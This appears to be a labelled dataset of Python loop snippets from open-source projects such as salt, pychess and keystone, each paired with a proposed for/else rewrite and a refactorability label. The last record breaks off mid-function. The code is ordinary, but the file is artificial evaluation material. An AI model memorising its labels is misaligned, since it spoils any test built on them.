adapter-transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/adapter-transformers/src/transformers/models/mobilebert/tokenization_mobilebert.py,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/mobilebert/tokenization_mobilebert.py,WordpieceTokenizer,tokenize$458,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
EasyTransfer,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/EasyTransfer/easytransfer/preprocessors/tokenization.py,https://github.com/alibaba/EasyTransfer/tree/master/easytransfer/preprocessors/tokenization.py,WordpieceTokenizer,tokenize$318,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + six.ensure_text(substr)
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_text(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_text(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_text(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + six.ensure_text(substr)
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
EasyTransfer,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/EasyTransfer/easytransfer/preprocessors/tokenization.py,https://github.com/alibaba/EasyTransfer/tree/master/easytransfer/preprocessors/tokenization.py,WordpieceTokenizer,tokenize$318,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + six.ensure_text(substr)
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_text(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_text(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + six.ensure_text(substr)
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
albert_pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/albert_pytorch/model/tokenization_bert.py,https://github.com/lonePatient/albert_pytorch/tree/master/model/tokenization_bert.py,WordpieceTokenizer,tokenize$352,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
albert_pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/albert_pytorch/model/tokenization_bert.py,https://github.com/lonePatient/albert_pytorch/tree/master/model/tokenization_bert.py,WordpieceTokenizer,tokenize$352,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
demucs,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/demucs/tools/automix.py,https://github.com/facebookresearch/demucs/tree/master/tools/automix.py,,find_candidate$174,"def find_candidate(spec_ref, catalog, pitch_match=True):
    """"""Given reference track, this finds a track in the catalog that
    is a potential match (pitch and tempo delta must be within the allowable limits).
    """"""
    candidates = list(catalog)
    random.shuffle(candidates)

    for spec in candidates:
        ok = False
        for scale in [1/4, 1/2, 1, 2, 4]:
            tempo = spec.tempo * scale
            delta_tempo = spec_ref.tempo / tempo - 1
            if abs(delta_tempo) < MAX_TEMPO:
                ok = True
                break
        if not ok:
            print(delta_tempo, spec_ref.tempo, spec.tempo, ""FAILED TEMPO"")
            # too much of a tempo difference
            continue
        spec = spec._replace(tempo=tempo)

        ps = 0
        if pitch_match:
            ps = best_pitch_shift(spec_ref.kr, spec.kr)
            if abs(ps) > MAX_PITCH:
                print(""Failed pitch"", ps)
                # too much pitch difference
                continue
        return spec, delta_tempo, ps","for scale in [1 / 4, 1 / 2, 1, 2, 4]:
    tempo = spec.tempo * scale
    delta_tempo = spec_ref.tempo / tempo - 1
    if abs(delta_tempo) < MAX_TEMPO:
        ok = True
        break
if not ok:
    print(delta_tempo, spec_ref.tempo, spec.tempo, 'FAILED TEMPO')
    continue","for scale in [1 / 4, 1 / 2, 1, 2, 4]:
    tempo = spec.tempo * scale
    delta_tempo = spec_ref.tempo / tempo - 1
    if abs(delta_tempo) < MAX_TEMPO:
        break
else:
    print(delta_tempo, spec_ref.tempo, spec.tempo, 'FAILED TEMPO')
    continue","for scale in [1 / 4, 1 / 2, 1, 2, 4]:
    tempo = spec.tempo * scale
    delta_tempo = spec_ref.tempo / tempo - 1
    if abs(delta_tempo) < MAX_TEMPO:
        break
else:
    print(delta_tempo, spec_ref.tempo, spec.tempo, 'FAILED TEMPO')
    continue",1,"for scale in [1 / 4, 1 / 2, 1, 2, 4]:
    tempo = spec.tempo * scale
    delta_tempo = spec_ref.tempo / tempo - 1
    if abs(delta_tempo) < MAX_TEMPO:
        ok = True
        break
if not ok:
    print(delta_tempo, spec_ref.tempo, spec.tempo, 'FAILED TEMPO')
    continue","break statement is executed:None
break statement is not executed:zejun1"
pychess,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pychess/lib/pychess/Players/engineList.py,https://github.com/pychess/pychess/tree/master/lib/pychess/Players/engineList.py,,listEnginesFromPath$757,"def listEnginesFromPath(defaultPath, maxDepth=3, withSymLink=False):
    # Base folders
    if defaultPath is None or defaultPath == """":
        base = os.getenv(""PATH"")
        maxDepth = 1
    else:
        base = defaultPath
    base = [os.path.join(p, """") for p in base.split("";"")]

    # List the executable files
    found_engines = []
    depth_current = 1
    depth_next = len(base)
    for depth_loop, dir in enumerate(base):
        files = os.listdir(dir)
        for file in files:
            file_ci = file.lower()
            fullname = os.path.join(dir, file)

            # Recurse the folders by appending to the scanned list
            if os.path.isdir(fullname):
                if not withSymLink and os.path.islink(fullname):
                    continue
                if maxDepth > 0:
                    if depth_loop == depth_next:
                        depth_current += 1
                        depth_next = len(base)
                    if depth_current <= maxDepth:
                        base.append(os.path.join(dir, file, """"))
                continue

            # Blacklisted keywords
            blacklisted = False
            for kw in [""install"", ""setup"", ""reset"", ""remove"", ""delete"", ""clean"", ""purge"", ""config"", ""register"", ""editor"", ""book""]:
                if kw in file_ci:
                    blacklisted = True
                    break
            if blacklisted:
                continue

            # Check if the file is a supported scripting language, or an executable file
            executable = False
            for vm in VM_LIST:
                if file_ci.endswith(vm.ext):
                    executable = True
                    break
            if not executable:
                if cpu['windows']:
                    executable = file_ci.endswith(cpu['binext'])
                else:
                    executable = os.access(fullname, os.X_OK)
            if not executable:
                continue

            # Check the filename against the known list of engines
            found = False
            for engine in ENGINES_LIST:
                if engine.name in file_ci:
                    found = True
                    break
            if not found:
                continue

            # Check the bitness because x64 does not run on x32
            if cpu['bitness'] == ""32"" and ""64"" in file_ci:
                continue

            # Check the support for POPCNT
            if not cpu['popcnt'] and ""popcnt"" in file_ci:
                continue

            # Check the support for BMI2
            if not cpu['bmi2'] and ""bmi2"" in file_ci:
                continue

            # Great, this is an engine !
            found_engines.append(fullname)

    # Return the found engines as an array of full file names
    return found_engines","for vm in VM_LIST:
    if file_ci.endswith(vm.ext):
        executable = True
        break
if not executable:
    if cpu['windows']:
        executable = file_ci.endswith(cpu['binext'])
    else:
        executable = os.access(fullname, os.X_OK)","for vm in VM_LIST:
    if file_ci.endswith(vm.ext):
        executable = True
        break
else:
    if cpu['windows']:
        executable = file_ci.endswith(cpu['binext'])
    else:
        executable = os.access(fullname, os.X_OK)","for vm in VM_LIST:
    if file_ci.endswith(vm.ext):
        executable = True
        break
else:
    if cpu['windows']:
        executable = file_ci.endswith(cpu['binext'])
    else:
        executable = os.access(fullname, os.X_OK)",1,"for vm in VM_LIST:
    if file_ci.endswith(vm.ext):
        executable = True
        break
if not executable:
    if cpu['windows']:
        executable = file_ci.endswith(cpu['binext'])
    else:
        executable = os.access(fullname, os.X_OK)","break statement is executed:None
break statement is not executed:zejun1"
pychess,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pychess/lib/pychess/Players/engineList.py,https://github.com/pychess/pychess/tree/master/lib/pychess/Players/engineList.py,,listEnginesFromPath$757,"def listEnginesFromPath(defaultPath, maxDepth=3, withSymLink=False):
    # Base folders
    if defaultPath is None or defaultPath == """":
        base = os.getenv(""PATH"")
        maxDepth = 1
    else:
        base = defaultPath
    base = [os.path.join(p, """") for p in base.split("";"")]

    # List the executable files
    found_engines = []
    depth_current = 1
    depth_next = len(base)
    for depth_loop, dir in enumerate(base):
        files = os.listdir(dir)
        for file in files:
            file_ci = file.lower()
            fullname = os.path.join(dir, file)

            # Recurse the folders by appending to the scanned list
            if os.path.isdir(fullname):
                if not withSymLink and os.path.islink(fullname):
                    continue
                if maxDepth > 0:
                    if depth_loop == depth_next:
                        depth_current += 1
                        depth_next = len(base)
                    if depth_current <= maxDepth:
                        base.append(os.path.join(dir, file, """"))
                continue

            # Blacklisted keywords
            blacklisted = False
            for kw in [""install"", ""setup"", ""reset"", ""remove"", ""delete"", ""clean"", ""purge"", ""config"", ""register"", ""editor"", ""book""]:
                if kw in file_ci:
                    blacklisted = True
                    break
            if blacklisted:
                continue

            # Check if the file is a supported scripting language, or an executable file
            executable = False
            for vm in VM_LIST:
                if file_ci.endswith(vm.ext):
                    executable = True
                    break
            if not executable:
                if cpu['windows']:
                    executable = file_ci.endswith(cpu['binext'])
                else:
                    executable = os.access(fullname, os.X_OK)
            if not executable:
                continue

            # Check the filename against the known list of engines
            found = False
            for engine in ENGINES_LIST:
                if engine.name in file_ci:
                    found = True
                    break
            if not found:
                continue

            # Check the bitness because x64 does not run on x32
            if cpu['bitness'] == ""32"" and ""64"" in file_ci:
                continue

            # Check the support for POPCNT
            if not cpu['popcnt'] and ""popcnt"" in file_ci:
                continue

            # Check the support for BMI2
            if not cpu['bmi2'] and ""bmi2"" in file_ci:
                continue

            # Great, this is an engine !
            found_engines.append(fullname)

    # Return the found engines as an array of full file names
    return found_engines","for engine in ENGINES_LIST:
    if engine.name in file_ci:
        found = True
        break
if not found:
    continue","for engine in ENGINES_LIST:
    if engine.name in file_ci:
        break
else:
    continue","for engine in ENGINES_LIST:
    if engine.name in file_ci:
        break
else:
    continue",1,"for engine in ENGINES_LIST:
    if engine.name in file_ci:
        found = True
        break
if not found:
    continue","break statement is executed:None
break statement is not executed:zejun1"
quodlibet,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/quodlibet/quodlibet/ext/events/searchprovider.py,https://github.com/quodlibet/quodlibet/tree/master/quodlibet/ext/events/searchprovider.py,,check_ini_installed$57,"def check_ini_installed():
    """"""Raise if no GNOME Shell ini file for Quod Libet is found""""""

    quodlibet_installed = False
    for path in get_gs_provider_files():
        try:
            with open(path, ""rb"") as handle:
                data = handle.read().decode(""utf-8"", ""replace"")
                if SearchProvider.BUS_NAME in data:
                    quodlibet_installed = True
                    break
        except EnvironmentError:
            pass

    if not quodlibet_installed:
        raise PluginImportException(
            _(""No GNOME Shell search provider for ""
              ""Quod Libet installed.""))","for path in get_gs_provider_files():
    try:
        with open(path, 'rb') as handle:
            data = handle.read().decode('utf-8', 'replace')
            if SearchProvider.BUS_NAME in data:
                quodlibet_installed = True
                break
    except EnvironmentError:
        pass
if not quodlibet_installed:
    raise PluginImportException(_('No GNOME Shell search provider for Quod Libet installed.'))","for path in get_gs_provider_files():
    try:
        with open(path, 'rb') as handle:
            data = handle.read().decode('utf-8', 'replace')
            if SearchProvider.BUS_NAME in data:
                break
    except EnvironmentError:
        pass
else:
    raise PluginImportException(_('No GNOME Shell search provider for Quod Libet installed.'))","for path in get_gs_provider_files():
    try:
        with open(path, 'rb') as handle:
            data = handle.read().decode('utf-8', 'replace')
            if SearchProvider.BUS_NAME in data:
                break
    except EnvironmentError:
        pass
else:
    raise PluginImportException(_('No GNOME Shell search provider for Quod Libet installed.'))",1,"for path in get_gs_provider_files():
    try:
        with open(path, 'rb') as handle:
            data = handle.read().decode('utf-8', 'replace')
            if SearchProvider.BUS_NAME in data:
                quodlibet_installed = True
                break
    except EnvironmentError:
        pass
if not quodlibet_installed:
    raise PluginImportException(_('No GNOME Shell search provider for Quod Libet installed.'))","break statement is executed:None
break statement is not executed:zejun1"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/renderers/pyobjects.py,https://github.com/saltstack/salt/tree/master/salt/renderers/pyobjects.py,,process_template$424,"def process_template(template):
        template_data = []
        # Do not pass our globals to the modules we are including and keep the root _globals untouched
        template_globals = dict(_globals)
        for line in template.readlines():
            line = line.rstrip(""\r\n"")
            matched = False
            for RE in (IMPORT_RE, FROM_RE):
                matches = RE.match(line)
                if not matches:
                    continue

                import_file = matches.group(1).strip()
                try:
                    imports = matches.group(2).split("","")
                except IndexError:
                    # if we don't have a third group in the matches object it means
                    # that we're importing everything
                    imports = None

                state_file = client.cache_file(import_file, saltenv)
                if not state_file:
                    raise ImportError(
                        ""Could not find the file '{}'"".format(import_file)
                    )

                with salt.utils.files.fopen(state_file) as state_fh:
                    state_contents, state_globals = process_template(state_fh)
                exec(state_contents, state_globals)

                # if no imports have been specified then we are being imported as: import salt://foo.sls
                # so we want to stick all of the locals from our state file into the template globals
                # under the name of the module -> i.e. foo.MapClass
                if imports is None:
                    import_name = os.path.splitext(os.path.basename(state_file))[0]
                    template_globals[import_name] = PyobjectsModule(
                        import_name, state_globals
                    )
                else:
                    for name in imports:
                        name = alias = name.strip()

                        matches = FROM_AS_RE.match(name)
                        if matches is not None:
                            name = matches.group(1).strip()
                            alias = matches.group(2).strip()

                        if name not in state_globals:
                            raise ImportError(
                                ""'{}' was not found in '{}'"".format(name, import_file)
                            )
                        template_globals[alias] = state_globals[name]

                matched = True
                break

            if not matched:
                template_data.append(line)

        return ""\n"".join(template_data), template_globals","for RE in (IMPORT_RE, FROM_RE):
    matches = RE.match(line)
    if not matches:
        continue
    import_file = matches.group(1).strip()
    try:
        imports = matches.group(2).split(',')
    except IndexError:
        imports = None
    state_file = client.cache_file(import_file, saltenv)
    if not state_file:
        raise ImportError(""Could not find the file '{}'"".format(import_file))
    with salt.utils.files.fopen(state_file) as state_fh:
        (state_contents, state_globals) = process_template(state_fh)
    exec(state_contents, state_globals)
    if imports is None:
        import_name = os.path.splitext(os.path.basename(state_file))[0]
        template_globals[import_name] = PyobjectsModule(import_name, state_globals)
    else:
        for name in imports:
            name = alias = name.strip()
            matches = FROM_AS_RE.match(name)
            if matches is not None:
                name = matches.group(1).strip()
                alias = matches.group(2).strip()
            if name not in state_globals:
                raise ImportError(""'{}' was not found in '{}'"".format(name, import_file))
            template_globals[alias] = state_globals[name]
    matched = True
    break
if not matched:
    template_data.append(line)","for RE in (IMPORT_RE, FROM_RE):
    matches = RE.match(line)
    if not matches:
        continue
    import_file = matches.group(1).strip()
    try:
        imports = matches.group(2).split(',')
    except IndexError:
        imports = None
    state_file = client.cache_file(import_file, saltenv)
    if not state_file:
        raise ImportError(""Could not find the file '{}'"".format(import_file))
    with salt.utils.files.fopen(state_file) as state_fh:
        (state_contents, state_globals) = process_template(state_fh)
    exec(state_contents, state_globals)
    if imports is None:
        import_name = os.path.splitext(os.path.basename(state_file))[0]
        template_globals[import_name] = PyobjectsModule(import_name, state_globals)
    else:
        for name in imports:
            name = alias = name.strip()
            matches = FROM_AS_RE.match(name)
            if matches is not None:
                name = matches.group(1).strip()
                alias = matches.group(2).strip()
            if name not in state_globals:
                raise ImportError(""'{}' was not found in '{}'"".format(name, import_file))
            template_globals[alias] = state_globals[name]
    break
else:
    template_data.append(line)","for RE in (IMPORT_RE, FROM_RE):
    matches = RE.match(line)
    if not matches:
        continue
    import_file = matches.group(1).strip()
    try:
        imports = matches.group(2).split(',')
    except IndexError:
        imports = None
    state_file = client.cache_file(import_file, saltenv)
    if not state_file:
        raise ImportError(""Could not find the file '{}'"".format(import_file))
    with salt.utils.files.fopen(state_file) as state_fh:
        (state_contents, state_globals) = process_template(state_fh)
    exec(state_contents, state_globals)
    if imports is None:
        import_name = os.path.splitext(os.path.basename(state_file))[0]
        template_globals[import_name] = PyobjectsModule(import_name, state_globals)
    else:
        for name in imports:
            name = alias = name.strip()
            matches = FROM_AS_RE.match(name)
            if matches is not None:
                name = matches.group(1).strip()
                alias = matches.group(2).strip()
            if name not in state_globals:
                raise ImportError(""'{}' was not found in '{}'"".format(name, import_file))
            template_globals[alias] = state_globals[name]
    break
else:
    template_data.append(line)",1,"for RE in (IMPORT_RE, FROM_RE):
    matches = RE.match(line)
    if not matches:
        continue
    import_file = matches.group(1).strip()
    try:
        imports = matches.group(2).split(',')
    except IndexError:
        imports = None
    state_file = client.cache_file(import_file, saltenv)
    if not state_file:
        raise ImportError(""Could not find the file '{}'"".format(import_file))
    with salt.utils.files.fopen(state_file) as state_fh:
        (state_contents, state_globals) = process_template(state_fh)
    exec(state_contents, state_globals)
    if imports is None:
        import_name = os.path.splitext(os.path.basename(state_file))[0]
        template_globals[import_name] = PyobjectsModule(import_name, state_globals)
    else:
        for name in imports:
            name = alias = name.strip()
            matches = FROM_AS_RE.match(name)
            if matches is not None:
                name = matches.group(1).strip()
                alias = matches.group(2).strip()
            if name not in state_globals:
                raise ImportError(""'{}' was not found in '{}'"".format(name, import_file))
            template_globals[alias] = state_globals[name]
    matched = True
    break
if not matched:
    template_data.append(line)","break statement is executed:None
break statement is not executed:zejun1"
keystone,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/keystone/keystone/auth/core.py,https://github.com/openstack/keystone/tree/master/keystone/auth/core.py,UserMFARulesValidator,_parse_rule_structure$471,"def _parse_rule_structure(rules, user_id):
        """"""Validate and parse the rule data structure.

        Rule sets must be in the form of list of lists. The lists may not
        have duplicates and must not be empty. The top-level list may be empty
        indicating that no rules exist.

        :param rules: The list of rules from the user_ref
        :type rules: list
        :param user_id: the user_id, used for logging purposes
        :type user_id: str
        :returns: list of list, duplicates are stripped
        """"""
        # NOTE(notmorgan): Most of this is done at the API request validation
        # and in the storage layer, it makes sense to also validate here and
        # ensure the data returned from the DB is sane, This will not raise
        # any exceptions, but just produce a usable set of data for rules
        # processing.
        rule_set = []
        if not isinstance(rules, list):
            LOG.error('Corrupt rule data structure for user %(user_id)s, '
                      'no rules loaded.',
                      {'user_id': user_id})
            # Corrupt Data means no rules. Auth success > MFA rules in this
            # case.
            return rule_set
        elif not rules:
            # Exit early, nothing to do here.
            return rule_set

        for r_list in rules:
            if not isinstance(r_list, list):
                # Rule was not a list, it is invalid, drop the rule from
                # being considered.
                LOG.info('Ignoring Rule %(type)r; rule must be a list of '
                         'strings.',
                         {'type': type(r_list)})
                continue

            if r_list:
                # No empty rules are allowed.
                _ok_rule = True
                for item in r_list:
                    if not isinstance(item, str):
                        # Rules may only contain strings for method names
                        # Reject a rule with non-string values
                        LOG.info('Ignoring Rule %(rule)r; rule contains '
                                 'non-string values.',
                                 {'rule': r_list})
                        # Rule is known to be bad, drop it from consideration.
                        _ok_rule = False
                        break
                # NOTE(notmorgan): No FOR/ELSE used here! Though it could be
                # done and avoid the use of _ok_rule. This is a note for
                # future developers to avoid using for/else and as an example
                # of how to implement it that is readable and maintainable.
                if _ok_rule:
                    # Unique the r_list and cast back to a list and then append
                    # as we know the rule is ok (matches our requirements).
                    # This is outside the for loop, as the for loop is
                    # only used to validate the elements in the list. The
                    # This de-dupe should never be needed, but we are being
                    # extra careful at all levels of validation for the MFA
                    # rules.
                    r_list = list(set(r_list))
                    rule_set.append(r_list)

        return rule_set","for item in r_list:
    if not isinstance(item, str):
        LOG.info('Ignoring Rule %(rule)r; rule contains non-string values.', {'rule': r_list})
        _ok_rule = False
        break
if _ok_rule:
    r_list = list(set(r_list))
    rule_set.append(r_list)","for item in r_list:
    if not isinstance(item, str):
        LOG.info('Ignoring Rule %(rule)r; rule contains non-string values.', {'rule': r_list})
        break
else:
    r_list = list(set(r_list))
    rule_set.append(r_list)","for item in r_list:
    if not isinstance(item, str):
        LOG.info('Ignoring Rule %(rule)r; rule contains non-string values.', {'rule': r_list})
        break
else:
    r_list = list(set(r_list))
    rule_set.append(r_list)",1,"for item in r_list:
    if not isinstance(item, str):
        LOG.info('Ignoring Rule %(rule)r; rule contains non-string values.', {'rule': r_list})
        _ok_rule = False
        break
if _ok_rule:
    r_list = list(set(r_list))
    rule_set.append(r_list)","break statement is executed:None
break statement is not executed:zejun1"
dpark,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/dpark/tools/executor.py,https://github.com/douban/dpark/tree/master/tools/executor.py,,launch_task$61,"def launch_task(self, driver, task):
    reply_status(driver, task.task_id, 'TASK_RUNNING')

    host = socket.gethostname()
    cwd, command, _env, shell, addr1, addr2, addr3 = pickle.loads(
        decode_data(task.data)
    )

    prefix = ""[%s@%s] "" % (str(task.task_id.value), host)
    prefix = prefix.encode('utf-8')
    outr, outw = os.pipe()
    errr, errw = os.pipe()
    t1 = Thread(target=forword, args=[outr, addr1, prefix])
    t1.daemon = True
    t1.start()
    t2 = Thread(target=forword, args=[errr, addr2, prefix])
    t2.daemon = True
    t2.start()
    wout = os.fdopen(outw, 'wb', 0)
    werr = os.fdopen(errw, 'wb', 0)

    if addr3:
        tid = int(task.task_id.value.split('-')[0])
        subscriber = ctx.socket(zmq.SUB)
        subscriber.connect(addr3)
